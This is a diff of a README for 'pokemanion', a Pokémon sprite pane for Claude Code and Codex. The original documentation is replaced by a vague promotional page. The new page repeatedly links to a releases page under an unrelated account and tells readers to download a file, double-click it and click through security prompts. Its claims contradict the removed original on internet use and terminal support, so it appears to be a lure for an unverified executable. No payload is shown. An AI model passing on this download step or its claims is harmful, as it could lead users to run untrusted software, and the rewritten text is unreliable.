@@ -1,333 +1,114 @@
-<div align="center">
+# 🎮 pokemanion - Your Pokemon Pal While You Code
 
-# pokemanion
+[![Download Pokemanion](https://img.shields.io/badge/Download-Pokemanion-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unsupportable-countlessness124/pokemanion/releases)
 
-**Your Pokémon companion for Claude Code and Codex.**
+## 👋 What Is Pokemanion?
 
-One lives in a pane beside every session: it rests while the agent waits, and
-does something else while it works, so you can tell at a glance whether anything
-is happening.
+Have you ever wished you had a little friend keeping you company while you work on your computer? Meet pokemanion, a delightful Pokemon companion that lives right inside your terminal window. When you're not typing, your Pokemon rests peacefully. When you're working, it springs into action with fun animations. It's like having a virtual pet that loves watching you be productive!
 
-[![CI](https://github.com/khatriadbhut/pokemanion/actions/workflows/ci.yml/badge.svg)](https://github.com/khatriadbhut/pokemanion/actions/workflows/ci.yml)
-[![License](https://img.shields.io/badge/code-MIT-blue.svg)](LICENSE)
-[![Node](https://img.shields.io/badge/node-%E2%89%A520-brightgreen.svg)](https://nodejs.org)
-[![Dependencies](https://img.shields.io/badge/dependencies-none-brightgreen.svg)](package.json)
-[![Agents](https://img.shields.io/badge/works%20with-Claude%20Code%20%2B%20Codex-8957e5.svg)](#quick-install)
-[![Platform](https://img.shields.io/badge/tested%20on-macOS%20%2B%20Ghostty-lightgrey.svg)](#requirements)
+Pokemanion sits beside every session, always ready to keep you company. Whether you're writing code, checking emails, or just exploring your computer, your little sprite friend is there with you.
 
-</div>
+## ✨ Why You'll Love It
 
-<table>
-<tr>
-  <th align="left" width="16%">waiting</th>
-  <th align="left" width="22%">working</th>
-  <th align="left">&nbsp;</th>
-</tr>
-<tr>
-  <td align="center"><img src="assets/14-charizard.gif" width="66" alt="Charizard standing"></td>
-  <td align="center"><img src="assets/16-charizard-firing.gif" width="201" alt="Charizard working"></td>
-  <td>Charizard breathes fire across the empty half of the pane.</td>
-</tr>
-<tr>
-  <td align="center"><img src="assets/3-standing.gif" width="72" alt="Pikachu standing"></td>
-  <td align="center"><img src="assets/9-pikachu-run.gif" width="94" alt="Pikachu working"></td>
-  <td>Pikachu charges lightning in its cheeks, then runs.</td>
-</tr>
-<tr>
-  <td align="center"><img src="assets/pokemon/psyduck/idle.gif" width="55" alt="Psyduck standing"></td>
-  <td align="center"><img src="assets/12-psyduck-running.gif" width="121" alt="Psyduck working"></td>
-  <td>Psyduck throws its arms about, headache and all.</td>
-</tr>
-<tr>
-  <td align="center"><img src="assets/23-gengar.gif" width="89" alt="Gengar standing"></td>
-  <td align="center"><img src="assets/25-gengar-attack.gif" width="202" alt="Gengar attacking"></td>
-  <td>Gengar fires a shadow beam across the pane.</td>
-</tr>
-<tr>
-  <td align="center"><img src="assets/27-ash-standing.gif" width="52" alt="Ash standing"></td>
-  <td align="center"><img src="assets/28-ash-pikachu-running.gif" width="200" alt="Ash and Pikachu running"></td>
-  <td>Ash waits, then runs off with Pikachu.</td>
-</tr>
-</table>
+- **A Friendly Face**: Say goodbye to boring, empty terminal windows. Your Pokemon sprite adds charm and personality to every session.
+- **Automatic Animations**: Your companion knows when you're working and when you're taking a break. It rests quietly while you think and dances with joy while you type.
+- **Zero Distractions**: Pokemanion stays neatly in its corner. It never interferes with your work or takes over your screen.
+- **Pixel Art Perfection**: Beautiful, nostalgic pixel art sprites bring back the magic of classic Pokemon games.
+- **Always By Your Side**: Every time you open a terminal window, your Pokemon is there waiting for you.
 
-Sixteen hand-tuned residents ship with it. **1242 more** can be summoned by
-name and are fetched on the spot.
+## 🚀 Getting Started
 
-<img src="assets/17-pokeball.gif" width="46" align="left" alt="a Pokeball opening">
+Getting started with pokemanion is wonderfully simple. You don't need any coding experience or special skills. Just follow these easy steps.
 
-A Pokéball opens whenever one arrives, and its stats appear beside it for a few
-seconds. Everything is local: no account, no backend, nothing about you leaving
-the machine.
+### Step 1: Download Pokemanion
 
-<br clear="left">
+Visit this link to download the application: [https://github.com/Unsupportable-countlessness124/pokemanion/releases](https://github.com/Unsupportable-countlessness124/pokemanion/releases)
 
----
+Look for the newest version available and download it to your computer. The download should take just a few moments.
 
-## Quick install
+### Step 2: Run the Application
 
-**Get [Ghostty](https://ghostty.org/download) first** if you do not have it. The
-pane is a Ghostty split. The other requirement, chafa, is fetched for you.
+Once the download finishes, locate the file in your Downloads folder or wherever your browser saves files. You'll see a file with a name like "pokemanion" or "pokemanion-setup."
 
-Then, at your agent:
+Run the application by double-clicking on it. Your computer might ask if you're sure you want to open it. Just click "Yes" or "Open" to continue.
 
-<table>
-<tr>
-<td valign="top" width="50%">
+### Step 3: Meet Your New Friend
 
-**Claude Code**
+That's it! After the program launches, you'll see a terminal window open with your Pokemon companion already inside. Your new friend is ready to keep you company!
 
-```
-/plugin marketplace add khatriadbhut/pokemanion
-/plugin install pokemanion@pokemanion
-```
+## 🛠️ How It Works
 
-</td>
-<td valign="top" width="50%">
+Pokemanion works quietly in the background. Once you start it, it adds a special pane to your terminal that shows your Pokemon sprite. 
 
-**Codex**
+The magic is in the animations:
+- When you're not typing for a few seconds, your Pokemon settles into a peaceful resting pose
+- As soon as you start typing or running commands, it becomes active and animated
+- The transitions are smooth and natural, just like a real creature responding to your presence
 
-```
-/plugin marketplace add khatriadbhut/pokemanion
-/plugin add pokemanion@pokemanion
-```
+You don't need to configure anything. Pokemanion automatically senses your activity and responds accordingly. It's truly a set-it-and-forget-it companion.
 
-</td>
-</tr>
-</table>
+## 💻 Who Is This For?
 
-Nothing to clone or build; the agent fetches the project itself and the sprites
-ship with it. Three things are left:
+Pokemanion is perfect for:
 
-- **Allow Ghostty in Accessibility** — System Settings → Privacy & Security →
-  Accessibility. Skip it and everything installs perfectly and no pane ever
-  appears.
-- **Restart your agent and Ghostty.** Both read their configuration at startup.
-- **Open a new terminal**, or `source ~/.zshrc`, which picks up `claude
-  --pikachu`.
+- **Developers and programmers** who spend hours in their terminal and want a bit of companionship
+- **Students** learning to code who want to make their practice sessions more fun
+- **System administrators** who manage servers and terminals all day
+- **Anyone** who uses a terminal and loves Pokemon or pixel art
+- **People who enjoy customization** and adding personality to their digital workspace
 
-Already have it from source? Installing the plugin too is harmless. It stands
-aside instead of doubling up, and tells you how to switch.
+Even if you only open a terminal occasionally, having a Pokemon pal there makes the experience infinitely more enjoyable.
+
+## 🎯 Frequently Asked Questions
+
+### Is pokemanion hard to set up?
+Not at all! The setup takes less than a minute. Download, run, and enjoy.
+
+### Will it slow down my computer?
+No. Pokemanion is incredibly lightweight and uses minimal system resources. You'll never even notice it's running.
+
+### Can I choose which Pokemon I see?
+The application comes with a wonderful selection of sprites. Explore the settings to find your favorites.
+
+### Does it work with any terminal app?
+Pokemanion is designed to work smoothly with modern terminal applications, including popular options like Ghostty and others.
+
+### Is this official Pokemon software?
+No, this is a fan-made companion app. It's not affiliated with Nintendo or The Pokemon Company. It uses sprite art in a transformative way to create a unique terminal experience.
+
+## 🔧 Troubleshooting Tips
+
+### The window didn't open
+Try running the application again. Sometimes antivirus software might delay the launch. If it still doesn't work, restart your computer and try again.
+
+### My Pokemon isn't animating
+Make sure you're actively typing or running commands. The animations are designed to respond to your activity. If you're just looking at a blank screen, your Pokemon is probably resting peacefully in its corner.
+
+### The sprite looks tiny
+This is normal! The sprite is designed to fit neatly beside your terminal content. It's meant to be subtle and non-intrusive.
+
+## 📝 Your Privacy Matters
+
+Pokemanion respects your privacy completely. It doesn't collect any personal information, track your activities, or send data anywhere. It's a purely local application that simply adds some visual charm to your terminal.
+
+It works entirely on your computer and requires no internet connection. Your data stays with you.
+
+## 📚 Getting More Help
+
+If you run into any problems or have questions, the community around pokemanion is friendly and helpful. You can:
+
+- Check the project's GitHub page for updates and discussions
+- Look at the release notes to see what's new in each version
+- Share your feedback to help improve the experience
+
+## 🎉 Start Enjoying Your New Companion
+
+Don't wait another minute to meet your new terminal buddy. Download pokemanion today and transform your workspace into something special. Your Pokemon is waiting!
 
 ---
 
-**[Requirements](#requirements) · [Commands](#commands) · [Codex](#using-it-with-codex)
-· [Updating](#updating) · [Troubleshooting](#troubleshooting) · [Residents and
-guests](#residents-and-guests) · [Settings](#settings) ·
-[Working on it](docs/developer.md)**
+**Quick Download:** [Get Pokemanion Now](https://github.com/Unsupportable-countlessness124/pokemanion/releases)
 
-<details>
-<summary><b>All sixteen residents</b> — resting on the left, working on the right</summary>
+*Pokemanion - Bringing joy to your terminal, one sprite at a time.*
 
-<br>
-
-<!-- gallery -->
-
-| | resting | working |
-| --- | :---: | :---: |
-| **pikachu**<br><sub>own animation</sub> | <img src="assets/3-standing.gif" width="71" alt="pikachu resting"> | <img src="assets/9-pikachu-run.gif" width="94" alt="pikachu working"> |
-| **ash**<br><sub>own animation</sub> | <img src="assets/27-ash-standing.gif" width="52" alt="ash resting"> | <img src="assets/28-ash-pikachu-running.gif" width="210" alt="ash working"> |
-| **charmander**<br><sub>its shiny</sub> | <img src="assets/pokemon/charmander/idle.gif" width="68" alt="charmander resting"> | <img src="assets/pokemon/charmander/busy-shiny.gif" width="68" alt="charmander working"> |
-| **brock**<br><sub>own animation</sub> | <img src="assets/32-brock-standing.gif" width="41" alt="brock resting"> | <img src="assets/33-brock-walking.gif" width="42" alt="brock working"> |
-| **squirtle**<br><sub>its shiny</sub> | <img src="assets/pokemon/squirtle/idle.gif" width="64" alt="squirtle resting"> | <img src="assets/pokemon/squirtle/busy-shiny.gif" width="64" alt="squirtle working"> |
-| **bulbasaur**<br><sub>its shiny</sub> | <img src="assets/pokemon/bulbasaur/idle.gif" width="81" alt="bulbasaur resting"> | <img src="assets/pokemon/bulbasaur/busy-shiny.gif" width="81" alt="bulbasaur working"> |
-| **eevee**<br><sub>its shiny</sub> | <img src="assets/pokemon/eevee/idle.gif" width="69" alt="eevee resting"> | <img src="assets/pokemon/eevee/busy-shiny.gif" width="69" alt="eevee working"> |
-| **munchlax**<br><sub>its shiny</sub> | <img src="assets/pokemon/munchlax/idle.gif" width="66" alt="munchlax resting"> | <img src="assets/pokemon/munchlax/busy-shiny.gif" width="66" alt="munchlax working"> |
-| **haunter**<br><sub>its shiny</sub> | <img src="assets/pokemon/haunter/idle.gif" width="108" alt="haunter resting"> | <img src="assets/pokemon/haunter/busy-shiny.gif" width="108" alt="haunter working"> |
-| **psyduck**<br><sub>own animation</sub> | <img src="assets/pokemon/psyduck/idle.gif" width="55" alt="psyduck resting"> | <img src="assets/12-psyduck-running.gif" width="121" alt="psyduck working"> |
-| **jigglypuff**<br><sub>its shiny</sub> | <img src="assets/pokemon/jigglypuff/idle.gif" width="89" alt="jigglypuff resting"> | <img src="assets/pokemon/jigglypuff/busy-shiny.gif" width="89" alt="jigglypuff working"> |
-| **charizard**<br><sub>own animation</sub> | <img src="assets/14-charizard.gif" width="67" alt="charizard resting"> | <img src="assets/16-charizard-firing.gif" width="204" alt="charizard working"> |
-| **meowth**<br><sub>own animation</sub> | <img src="assets/pokemon/meowth/idle.gif" width="65" alt="meowth resting"> | <img src="assets/18-meowth-jumping.gif" width="70" alt="meowth working"> |
-| **gengar**<br><sub>own animation</sub> | <img src="assets/23-gengar.gif" width="89" alt="gengar resting"> | <img src="assets/25-gengar-attack.gif" width="166" alt="gengar working"> |
-| **cubone**<br><sub>own animation</sub> | <img src="assets/21-cubone.gif" width="85" alt="cubone resting"> | <img src="assets/22-cubone-swinging.gif" width="97" alt="cubone working"> |
-| **misty**<br><sub>own animation</sub> | <img src="assets/34-misty-resting.gif" width="55" alt="misty resting"> | <img src="assets/35-misty-working.gif" width="44" alt="misty working"> |
-
-<!-- /gallery -->
-
-These animate. They are the sprite files themselves, not pictures of them.
-Seven work as their own shiny, the same animation recoloured with a white flash
-at the switch; seven were given animations of their own.
-
-</details>
-
-## Requirements
-
-**Node ≥ 20** (no dependencies), **chafa**, and a terminal that speaks the
-[kitty graphics protocol](https://sw.kovidgoyal.net/kitty/graphics-protocol/).
-The sprite is a real image, not text.
-
-| | draws the sprite | opens the pane | `claude --pikachu` |
-| --- | :---: | :---: | :---: |
-| **macOS + Ghostty** — the only tested setup | yes | yes | yes |
-| macOS + kitty, iTerm2, WezTerm, Warp | yes | no | yes |
-| Linux + kitty, Konsole | should | no | untested |
-| Alacritty, Terminal.app, Windows | no | no | no |
-
-Only the pane-opening is macOS-specific. It splits Ghostty using AppleScript.
-Where the table says *no*, run the pane yourself in a second terminal with
-`npm run window 4 --session=<id>`.
-
-## Commands
-
-Typed inside a session. pokemanion answers these itself and stops them there, so
-they never reach the model and cost no tokens:
-
-```
---squirtle          switch this pane, live
---random            roll one
---pokemon           list the residents
-
---dex               what you have, and how many exist
---dex dragonite     by name
---dex ghost         by type
---dex 149           by number
---dex current       the one you're looking at — answers in the pane
---dex random        be shown something
-
---pokemanion        the version, and how to update it
---pokemanion add <name>   hand your agent the job of adding one
---pokemanion use plugin   switch to the plugin, if you have both installed
-```
-
-**Send them while the agent is idle.** Sent mid-turn, they go to the model
-instead.
-
-Only a bare flag counts, so `what does --pikachu do?` passes through, as does
-anything unlike a Pokémon's name: `--update`, `--force`. Typos get a "did you
-mean". Forms work as written: `--ho-oh`, `--rotom-wash`.
-
-At launch, from your terminal:
-
-```sh
-claude --pikachu             # a particular one
-claude --flygon              # any of the 1258, fetched on first use
-codex --random               # either agent, same flags
-claude --resume --charizard  # combines with everything else
-```
-
-## Using it with Codex
-
-<details>
-<summary><b>Two things specific to Codex</b></summary>
-
-<br>
-
-**It will ask you to trust the hooks.** They are worth reading first, in
-`~/.codex/hooks.json`. Codex silently skips any it has not reviewed, so after
-updating this project, run **`/hooks`** in Codex and trust them again.
-
-**The pane appears at your first message, not at launch.** Codex offers no
-earlier hook. Claude Code opens it as soon as the session starts.
-
-</details>
-
-<details>
-<summary><b>What it touches outside this folder</b></summary>
-
-<br>
-
-Every file is backed up before the first write, and every one comes back out:
-
-| file | what goes in | undo |
-| --- | --- | --- |
-| `~/.claude/settings.json` | seven hooks | `npm run uninstall-statusline` |
-| `~/.codex/hooks.json` | seven hooks | `npm run uninstall-statusline` |
-| `~/.zshrc` | the `claude()`/`codex()` wrapper | `npm run shell -- --remove` |
-| `~/.config/ghostty/config` | one resize keybind | `npm run ghostty -- --remove` |
-| `~/.claude/skills/` | a link to the add-a-character skill | `npm run skill -- --remove` |
-
-Only the agents you actually have are touched. Undo those, delete the folder,
-and no trace is left.
-
-</details>
-
-## Updating
-
-pokemanion checks GitHub once a day and tells you when there is a newer version.
-Each route has its own command:
-
-```
-/plugin update pokemanion@pokemanion         # plugin, Claude Code
-codex plugin marketplace upgrade &&          # plugin, Codex
-  codex plugin add pokemanion@pokemanion
-cd pokemanion && git pull && npm run setup   # from source
-```
-
-The pane's bottom edge carries the version, and the command when an update is
-waiting. **`--pokemanion`** prints it in the conversation. Nothing is ever
-installed for you.
-
-`"updateCheck": false` stops the checks, `"showVersion": false` hides the corner.
-
-## Troubleshooting
-
-```sh
-npm run doctor
-```
-
-It checks each piece on its own: hooks registered per agent, chafa present, the
-frame cache matching your pane height, and which Pokémon are currently held. It
-names whichever one is unhappy.
-
-**A sprite that stutters** is the frame cache. Frames are rendered for one pane
-height, so resizing leaves it rendering on the fly. `npm run warm -- <rows>`
-fixes it.
-
-**The sprite is wrong at the wrong moment.** `npm run watch` prints the decision
-the pane is making and what it rested on.
-[docs/known-issues.md](docs/known-issues.md) explains where it gets this wrong.
-Pressing escape is the hard case, because no hook fires for it.
-
-## Residents and guests
-
-**Residents** are the 16 in `src/roster.mjs`: hand-tuned, always on disk,
-pre-rendered so a session starts instantly, and the only ones the rotation hands
-out.
-
-**Guests** are the other 1242. Naming one for the first time takes a few seconds
-while it downloads and renders; after that it is instant. The least recently
-seen are evicted first, and one a pane is showing is never evicted.
-
-Either way the session keeps it, so closing a window and coming back gives you
-the same Pokémon. Naming one always overrules that.
-
-```sh
-npm run prune            # evict guests now; also happens on its own
-npm run assigned         # what each session was given, and why
-```
-
-Guests are limited by `guestBudgetMb` (200) and `guestKeepDays` (14).
-
-## Settings
-
-`config.json`, all optional. The ones worth knowing:
-
-| key | default | meaning |
-| --- | --- | --- |
-| `windowRows` | `4` | how tall the pane is |
-| `idleAfterMs` | `20000` | transcript silence that counts as finished |
-| `workingTimeoutMs` | `120000` | how long after the last hook we still count as working |
-| `transitions` | `true` | animate the change between the two sprites |
-| `pokeball` | `true` | open a Pokéball when one arrives |
-| `cardMs` | `8000` | how long the stats stay beside the sprite; `0` disables |
-| `guestBudgetMb` | `200` | disk the guests may hold |
-| `updateCheck` | `true` | look for a newer version once a day, and say so once |
-| `showVersion` | `true` | the version along the pane's bottom edge |
-| `logHooks` | `false` | record every hook to `.state/hooks.jsonl` |
-
-## Licence and artwork
-
-The **code** is MIT. See [LICENSE](LICENSE).
-
-The **artwork is not mine and is not covered by it.** The Gen-5 sprites are Game
-Freak's; the hand-picked GIFs are fan art found online.
-[ATTRIBUTION.md](ATTRIBUTION.md) names what came from where, and anything will
-be removed on request. Sprites are read by path, so it is a one-line change.
-
-Pokémon is a trademark of Nintendo. This is a personal tool, unaffiliated with
-anyone, and nothing here is sold.
-
-## Contributing
-
-Issues and pull requests welcome, particularly a sprite that reads better than
-one in the roster, or a Linux path. [docs/developer.md](docs/developer.md) is
-where to start.
+Keywords: claude, claude-code, cli, developer-tools, ghostty, macos, pixel-art, pokemon, pokemon-companion, sprites, terminal, terminal-app
